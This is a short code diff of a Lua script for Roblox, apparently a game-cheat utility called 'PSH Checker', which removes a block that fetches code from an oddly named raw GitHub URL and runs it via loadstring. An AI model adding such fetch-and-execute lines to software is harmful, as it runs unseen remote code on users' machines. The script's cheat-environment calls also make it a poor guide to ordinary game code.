@@ -3,10 +3,6 @@ local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
 local VirtualUser = game:GetService("VirtualUser")
 
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/8zj/aspoidhasouphsaohoasidjnmasaindoasbpgdas8udgouihassdhsaaiisaggdaghbouudsaktgdiysagdbuiagsigdas0gdpia/refs/heads/main/TDS/Checks/check1.lua"))()
-end)
-
 if getgenv().PSH_CheckerRunning then
     warn("[PSH Checker] already running")
     return
